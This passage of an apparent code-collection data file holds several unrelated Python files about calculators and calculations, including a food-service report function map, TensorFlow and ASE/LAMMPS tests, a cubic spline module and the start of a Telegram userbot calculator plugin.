calc_fact_services.get_indv_total_hh_wminor,\n        18: calc_fact_services.get_indv_total_hh_wominor,\n        19: calc_fact_services.get_indv_total,\n        20: calc_fact_services.get_hh_wsenior,\n        21: calc_fact_services.get_hh_wosenior,\n        22: calc_fact_services.get_hh_grandparent,\n        23: calc_service_types.get_services_summary,\n        24: calc_service_types.get_services_category,\n        25: calc_service_types.get_distribution_outlets,\n        26: calc_families.get_frequency_visits,\n        27: calc_families.get_frequency_visits,\n        28: calc_families.get_household_composition,\n        29: calc_families.get_family_comp_key_insight,\n        30: calc_families.get_household_size_distribution_1_to_10,\n        31: calc_families.get_household_size_distribution_classic,\n        32: calc_new_families.get_new_families,\n        33: calc_new_families.get_new_members,\n        34: calc_new_families.get_new_members_to_old_families,\n        35: calc_new_families.get_services_to_new_families,\n        36: calc_new_families.get_families_first_service,\n        37: calc_new_families.get_new_families_freq_visits,\n        38: calc_new_families.get_new_families_freq_visits,\n        39: calc_new_families.get_new_fam_household_composition,\n        40: calc_new_families.get_new_fam_composition_key_insight,\n        41: calc_new_families.get_new_fam_hh_size_dist_1_to_10,\n        42: calc_new_families.get_new_fam_hh_size_dist_classic,\n        43: calc_new_families.get_relationship_length_fam_mean,\n        44: calc_new_families.get_new_fam_dist_of_length_of_relationship,\n        45: calc_new_families.get_relationship_length_indv_mean,\n        46: calc_new_families.get_new_fam_dist_of_length_of_relationships_for_individuals,\n        47: calc_geographies.get_geo_coverage,\n        48: calc_geographies.get_geo_breakdown_fam_state,\n        49: calc_geographies.get_geographic_breakdown_fam_county,\n        50: calc_geographies.get_geographic_breakdown_fam_zcta,\n        51: calc_geographies.get_services_flow_event_fips,\n        52: calc_geographies.get_distance_traveled,\n        53: calc_geographies.get_direction_traveled,\n        54: calc_geographies.get_windrose,\n        55: calc_geographies.get_sites_visited_distribution,\n        56: calc_geographies.get_dummy_trip_coverage,\n        57: calc_service_trends.get_service_trend_time_month,\n        58: calc_service_trends.get_service_trend_time_week,\n        59: calc_service_trends.get_service_trend_time_day,\n        60: calc_service_trends.get_service_trend_monthy_visits_avg,\n        61: calc_service_trends.get_service_trend_monthly_people_dup,\n        62: calc_service_trends.get_service_trend_monthly_group_dup,\n        63: calc_service_trends.get_service_trend_service_category,\n        64: calc_service_trends.get_service_trend_comparison,\n        65: calc_service_trends.get_service_summary_dow,\n        66: calc_service_trends.get_service_summary_hod,\n        67: calc_service_trends.get_service_summary_dowhod,\n        68: calc_service_trends.get_service_trend_event,\n        69: calc_family_members.get_gender_summary,\n        70: calc_family_members.get_hoh_single_adult_w_children,\n        71: calc_family_members.get_skipped_generation,\n        72: calc_family_members.get_demo_indv_gender,\n        73: calc_family_members.get_demo_indv_age_groups,\n        74: calc_family_members.get_hh_has_age_groups,\n        75: calc_family_members.get_population_pyramid,\n        76: calc_family_members.get_demo_indv_race,\n        77: calc_family_members.get_demo_indv_ethnic,\n        78: calc_family_members.get_demo_indv_military,\n        79: calc_family_members.get_demo_indv_education,\n        80: calc_family_members.get_demo_indv_employment,\n        81: calc_family_members.get_demo_indv_health_insurnace\n    }\n\n", "234": "##########################################################################\r\n# test calculator use as an extended and embedded gui component;\r\n##########################################################################\r\n     \r\nfrom Tkinter import *\r\nfrom calculator import CalcGui\r\nfrom PP3E.Dbase.TableBrowser.guitools import *\r\n     \r\ndef calcContainer(parent=None):\r\n    frm = Frame(parent)       \r\n    frm.pack(expand=YES, fill=BOTH)\r\n    Label(frm, text='Calc Container').pack(side=TOP)\r\n    CalcGui(frm)\r\n    Label(frm, text='Calc Container').pack(side=BOTTOM)\r\n    return frm\r\n     \r\nclass calcSubclass(CalcGui): \r\n    def makeWidgets(self, fg, bg, font):\r\n        Label(self, text='Calc Subclass').pack(side=TOP)\r\n        Label(self, text='Calc Subclass').pack(side=BOTTOM)\r\n        CalcGui.makeWidgets(self, fg, bg, font)\r\n        #Label(self, text='Calc Subclass').pack(side=BOTTOM)\r\n     \r\nif __name__ == '__main__': \r\n    import sys\r\n    if len(sys.argv) == 1:            # % calculator_test.py\r\n        root = Tk()                   # run 3 calcs in same process\r\n        CalcGui(Toplevel())           # each in a new toplevel window\r\n        calcContainer(Toplevel())\r\n        calcSubclass(Toplevel()) \r\n        Button(root, text='quit', command=root.quit).pack()\r\n        root.mainloop()\r\n    if len(sys.argv) == 2:            # % calculator_testl.py -\r\n        CalcGui().mainloop()          # as a standalone window (default root)\r\n    elif len(sys.argv) == 3:          # % calculator_test.py - - \r\n        calcContainer().mainloop()    # as an embedded component\r\n    elif len(sys.argv) == 4:          # % calculator_test.py - - - \r\n        calcSubclass().mainloop()     # as a customized superclass\r\n", "235": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow.compat.v1 as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "236": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow.compat.v1 as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "237": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow.compat.v1 as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "238": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "239": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "240": "import math\nimport numpy as np\nimport bisect\n\n\nclass Spline:\n    u\"\"\"\n    Cubic Spline class\n    \"\"\"\n    def __init__(self, x, y):\n        self.b, self.c, self.d, self.w = [], [], [], []\n        self.x = x\n        self.y = y\n        self.nx = len(x)\n        h = np.diff(x)\n        self.a = [iy for iy in y]\n        A = self.__calc_A(h)\n        B = self.__calc_B(h)\n        self.c = np.linalg.solve(A, B)\n        for i in range(self.nx - 1):\n            self.d.append((self.c[i + 1] - self.c[i]) / (3.0 * h[i]))\n            tb = (self.a[i + 1] - self.a[i]) / h[i] - h[i] * \\\n                (self.c[i + 1] + 2.0 * self.c[i]) / 3.0\n            self.b.append(tb)\n    def calc(self, t):\n        u\"\"\"\n        Calc position\n\n        if t is outside of the input x, return None\n\n        \"\"\"\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = self.a[i] + self.b[i] * dx + \\\n            self.c[i] * dx ** 2.0 + self.d[i] * dx ** 3.0\n        return result\n\n    def calcd(self, t):\n        u\"\"\"\n        Calc first derivative\n\n        if t is outside of the input x, return None\n        \"\"\"\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = self.b[i] + 2.0 * self.c[i] * dx + 3.0 * self.d[i] * dx ** 2.0\n        return result\n\n    def calcdd(self, t):\n        u\"\"\"\n        Calc second derivative\n        \"\"\"\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = 2.0 * self.c[i] + 6.0 * self.d[i] * dx\n        return result\n\n    def __search_index(self, x):\n        u\"\"\"\n        search data segment index\n        \"\"\"\n        return bisect.bisect(self.x, x) - 1\n\n    def __calc_A(self, h):\n        u\"\"\"\n        calc matrix A for spline coefficient c\n        \"\"\"\n        A = np.zeros((self.nx, self.nx))\n        A[0, 0] = 1.0\n        for i in range(self.nx - 1):\n            if i != (self.nx - 2):\n                A[i + 1, i + 1] = 2.0 * (h[i] + h[i + 1])\n            A[i + 1, i] = h[i]\n            A[i, i + 1] = h[i]\n\n        A[0, 1] = 0.0\n        A[self.nx - 1, self.nx - 2] = 0.0\n        A[self.nx - 1, self.nx - 1] = 1.0\n        return A\n\n    def __calc_B(self, h):\n        u\"\"\"\n        calc matrix B for spline coefficient c\n        \"\"\"\n        B = np.zeros(self.nx)\n        for i in range(self.nx - 2):\n            B[i + 1] = 3.0 * (self.a[i + 2] - self.a[i + 1]) / \\\n                h[i + 1] - 3.0 * (self.a[i + 1] - self.a[i]) / h[i]\n        return B\n\n\nclass Spline2D:\n    u\"\"\"\n    2D Cubic Spline class\n\n    \"\"\"\n    def __init__(self, x, y):\n        self.s = self.__calc_s(x, y)\n        self.sx = Spline(self.s, x)\n        self.sy = Spline(self.s, y)\n\n    def __calc_s(self, x, y):\n        dx = np.diff(x)\n        dy = np.diff(y)\n        self.ds = [math.sqrt(idx ** 2 + idy ** 2)\n                   for (idx, idy) in zip(dx, dy)]\n        s = [0]\n        s.extend(np.cumsum(self.ds))\n        return s\n\n    def calc_position(self, s):\n        u\"\"\"\n        calc position\n        \"\"\"\n        x = self.sx.calc(s)\n        y = self.sy.calc(s)\n        return x, y\n\n    def calc_curvature(self, s):\n        u\"\"\"\n        calc curvature\n        \"\"\"\n        dx = self.sx.calcd(s)\n        ddx = self.sx.calcdd(s)\n        dy = self.sy.calcd(s)\n        ddy = self.sy.calcdd(s)\n        k = (ddy * dx - ddx * dy) / (dx ** 2 + dy ** 2)\n        return k\n\n    def calc_yaw(self, s):\n        u\"\"\"\n        calc yaw\n        \"\"\"\n        dx = self.sx.calcd(s)\n        dy = self.sy.calcd(s)\n        yaw = math.atan2(dy, dx)\n        return yaw\n\n\ndef calc_spline_course(x, y, ds=0.1):\n    sp = Spline2D(x, y)\n    s = list(np.arange(0, sp.s[-1], ds))\n    rx, ry, ryaw, rk = [], [], [], []\n    for i_s in s:\n        ix, iy = sp.calc_position(i_s)\n        rx.append(ix)\n        ry.append(iy)\n        ryaw.append(sp.calc_yaw(i_s))\n        rk.append(sp.calc_curvature(i_s))\n    return rx, ry, ryaw, rk, s\n\n\ndef main():\n    print(\"Spline 2D test\")\n    import matplotlib.pyplot as plt\n    x = [-2.5, 0.0, 2.5, 5.0, 7.5, 3.0, -1.0]\n    y = [0.7, -6, 5, 6.5, 0.0, 5.0, -2.0]\n    sp = Spline2D(x, y)\n    s = np.arange(0, sp.s[-1], 0.1)\n    rx, ry, ryaw, rk = [], [], [], []\n    for i_s in s:\n        ix, iy = sp.calc_position(i_s)\n        rx.append(ix)\n        ry.append(iy)\n        ryaw.append(sp.calc_yaw(i_s))\n        rk.append(sp.calc_curvature(i_s))\n    flg, ax = plt.subplots(1)\n    plt.plot(x, y, \"xb\", label=\"input\")\n    plt.plot(rx, ry, \"-r\", label=\"spline\")\n    plt.grid(True)\n    plt.axis(\"equal\")\n    plt.xlabel(\"x[m]\")\n    plt.ylabel(\"y[m]\")\n    plt.legend()\n    flg, ax = plt.subplots(1)\n    plt.plot(s, [math.degrees(iyaw) for iyaw in ryaw], \"-r\", label=\"yaw\")\n    plt.grid(True)\n    plt.legend()\n    plt.xlabel(\"line length[m]\")\n    plt.ylabel(\"yaw angle[deg]\")\n    flg, ax = plt.subplots(1)\n    plt.plot(s, rk, \"-r\", label=\"curvature\")\n    plt.grid(True)\n    plt.legend()\n    plt.xlabel(\"line length[m]\")\n    plt.ylabel(\"curvature [1/m]\")\n    plt.show()\n\n\nif __name__ == '__main__':\n    main()\n", "241": "import pytest\nimport unittest\n\nfrom app.calc import Calculator\n\n\n@pytest.mark.unit\nclass TestCalculate(unittest.TestCase):\n    def setUp(self):\n        self.calc = Calculator()\n\n    def test_add_method_returns_correct_result(self):\n        self.assertEqual(4, self.calc.add(2, 2))\n        self.assertEqual(0, self.calc.add(2, -2))\n        self.assertEqual(0, self.calc.add(-2, 2))\n        self.assertEqual(1, self.calc.add(1, 0))\n\n    def test_add_method_returns_correct_result1(self):\n        self.assertEqual(5, self.calc.add(3, 2))\n        self.assertEqual(0, self.calc.add(2, -2))\n        self.assertEqual(0, self.calc.add(-2, 2))\n        self.assertEqual(1, self.calc.add(1, 0))      \n        \n    def test_divide_method_returns_correct_result(self):\n        self.assertEqual(1, self.calc.divide(2, 2))\n        self.assertEqual(1.5, self.calc.divide(3, 2))\n        self.assertRaises(TypeError, self.calc.divide, \"2\", 2)\n\n    def test_add_method_fails_with_nan_parameter(self):\n        self.assertRaises(TypeError, self.calc.add, \"2\", 2)\n        self.assertRaises(TypeError, self.calc.add, 2, \"2\")\n        self.assertRaises(TypeError, self.calc.add, \"2\", \"2\")\n        self.assertRaises(TypeError, self.calc.add, None, 2)\n        self.assertRaises(TypeError, self.calc.add, 2, None)\n        self.assertRaises(TypeError, self.calc.add, object(), 2)\n        self.assertRaises(TypeError, self.calc.add, 2, object())\n\n    def test_divide_method_fails_with_nan_parameter(self):\n        self.assertRaises(TypeError, self.calc.divide, \"2\", 2)\n        self.assertRaises(TypeError, self.calc.divide, 2, \"2\")\n        self.assertRaises(TypeError, self.calc.divide, \"2\", \"2\")\n\n    def test_divide_method_fails_with_division_by_zero(self):\n        self.assertRaises(TypeError, self.calc.divide, 2, 0)\n        self.assertRaises(TypeError, self.calc.divide, 2, -0)\n        self.assertRaises(TypeError, self.calc.divide, 0, 0)\n        self.assertRaises(TypeError, self.calc.divide, \"0\", 0)\n\n    def test_multiply_method_returns_correct_result(self):\n        self.assertEqual(4, self.calc.multiply(2, 2))\n        self.assertEqual(0, self.calc.multiply(1, 0))\n        self.assertEqual(0, self.calc.multiply(-1, 0))\n        self.assertEqual(-2, self.calc.multiply(-1, 2))\n        self.assertRaises(TypeError, self.calc.multiply, \"0\", 0)\n        \n    def test_power_method_returns_correct_result(self):\n        self.assertEqual(4, self.calc.power(2, 2))\n        self.assertEqual(1, self.calc.power(1, 0))\n        self.assertEqual(1, self.calc.power(-1, 0))\n        self.assertEqual(-27, self.calc.power(-3, 3))\n        self.assertRaises(TypeError, self.calc.power, \"0\", 0)\n        \n    def test_substract_method_returns_correct_result(self):\n        self.assertEqual(4, self.calc.substract(10, 6))\n        self.assertEqual(-2, self.calc.substract(256, 258))\n        self.assertEqual(-1, self.calc.substract(-1, 0))\n        self.assertEqual(0, self.calc.substract(0, 0))\n        self.assertEqual(0, self.calc.substract(0, 0))\n        self.assertRaises(TypeError, self.calc.substract, \"0\", 0)\n        \nif __name__ == \"__main__\":  # pragma: no cover\n    unittest.main()\n", "242": "import pytest\nimport numpy as np\nfrom ase import Atom\nfrom ase.build import bulk\nimport ase.io\nfrom ase import units\nfrom ase.md.verlet import VelocityVerlet\n\n\n@pytest.fixture\ndef Atoms_fcc_Ni_with_H_at_center():\n    atoms = bulk(\"Ni\", cubic=True)\n    atoms += Atom(\"H\", position=atoms.cell.diagonal() / 2)\n    return atoms\n\n\n@pytest.fixture\ndef lammps_data_file_Fe(datadir):\n    return datadir / \"lammpslib_simple_input.data\"\n\n\n@pytest.fixture\ndef calc_params_Fe(lammps_data_file_Fe):\n    calc_params = {}\n    calc_params[\"lammps_header\"] = [\n        \"units           real\",\n        \"atom_style      full\",\n        \"boundary        p p p\",\n        \"box tilt        large\",\n        \"pair_style      lj/cut/coul/long 12.500\",\n        \"bond_style      harmonic\",\n        \"angle_style     harmonic\",\n        \"kspace_style    ewald 0.0001\",\n        \"kspace_modify   gewald 0.01\",\n        f\"read_data      {lammps_data_file_Fe}\",\n    ]\n    calc_params[\"lmpcmds\"] = []\n    calc_params[\"atom_types\"] = {\"Fe\": 1}\n    calc_params[\"create_atoms\"] = False\n    calc_params[\"create_box\"] = False\n    calc_params[\"boundary\"] = False\n    calc_params[\"log_file\"] = \"test.log\"\n    calc_params[\"keep_alive\"] = True\n    return calc_params\n\n\n@pytest.fixture\ndef Atoms_Fe(lammps_data_file_Fe):\n    Atoms_Fe = ase.io.read(\n        lammps_data_file_Fe,\n        format=\"lammps-data\",\n        Z_of_type={1: 26},\n        units=\"real\",\n    )\n    return Atoms_Fe\n\n\n@pytest.mark.calculator_lite\n@pytest.mark.calculator(\"lammpslib\")\ndef test_lammpslib_simple(\n    factory,\n    calc_params_NiH,\n    Atoms_fcc_Ni_with_H_at_center,\n    calc_params_Fe,\n    Atoms_Fe,\n):\n    \"\"\"\n    Get energy from a LAMMPS calculation of an uncharged system.\n    This was written to run with the 30 Apr 2019 version of LAMMPS,\n    for which uncharged systems require the use of 'kspace_modify gewald'.\n    \"\"\"\n    NiH = Atoms_fcc_Ni_with_H_at_center\n\n    # Add a bit of distortion to the cell\n    NiH.set_cell(\n        NiH.cell + [[0.1, 0.2, 0.4], [0.3, 0.2, 0.0], [0.1, 0.1, 0.1]],\n        scale_atoms=True,\n    )\n\n    calc = factory.calc(**calc_params_NiH)\n    NiH.calc = calc\n\n    E = NiH.get_potential_energy()\n    F = NiH.get_forces()\n    S = NiH.get_stress()\n\n    print(\"Energy: \", E)\n    print(\"Forces:\", F)\n    print(\"Stress: \", S)\n    print()\n\n    E = NiH.get_potential_energy()\n    F = NiH.get_forces()\n    S = NiH.get_stress()\n\n    calc = factory.calc(**calc_params_NiH)\n    NiH.calc = calc\n\n    E2 = NiH.get_potential_energy()\n    F2 = NiH.get_forces()\n    S2 = NiH.get_stress()\n\n    assert E == pytest.approx(E2, rel=1e-4)\n    assert F == pytest.approx(F2, rel=1e-4)\n    assert S == pytest.approx(S2, rel=1e-4)\n\n    NiH.rattle(stdev=0.2)\n    E3 = NiH.get_potential_energy()\n    F3 = NiH.get_forces()\n    S3 = NiH.get_stress()\n\n    print(\"rattled atoms\")\n    print(\"Energy: \", E3)\n    print(\"Forces:\", F3)\n    print(\"Stress: \", S3)\n    print()\n\n    assert not np.allclose(E, E3)\n    assert not np.allclose(F, F3)\n    assert not np.allclose(S, S3)\n\n    # Add another H\n    NiH += Atom(\"H\", position=NiH.cell.diagonal() / 4)\n    E4 = NiH.get_potential_energy()\n    F4 = NiH.get_forces()\n    S4 = NiH.get_stress()\n\n    assert not np.allclose(E4, E3)\n    assert not np.allclose(F4[:-1, :], F3)\n    assert not np.allclose(S4, S3)\n\n    # the example from the docstring\n\n    NiH = Atoms_fcc_Ni_with_H_at_center\n    calc = factory.calc(**calc_params_NiH)\n    NiH.calc = calc\n    print(\"Energy \", NiH.get_potential_energy())\n\n    # a more complicated example, reading in a LAMMPS data file\n    calc = factory.calc(**calc_params_Fe)\n    Atoms_Fe.calc = calc\n    dyn = VelocityVerlet(Atoms_Fe, 1 * units.fs)\n\n    energy = Atoms_Fe.get_potential_energy()\n    assert energy == pytest.approx(2041.411982950972, rel=1e-4)\n\n    dyn.run(10)\n    energy = Atoms_Fe.get_potential_energy()\n    assert energy == pytest.approx(312.4315854721744, rel=1e-4)\n", "243": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import *\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = 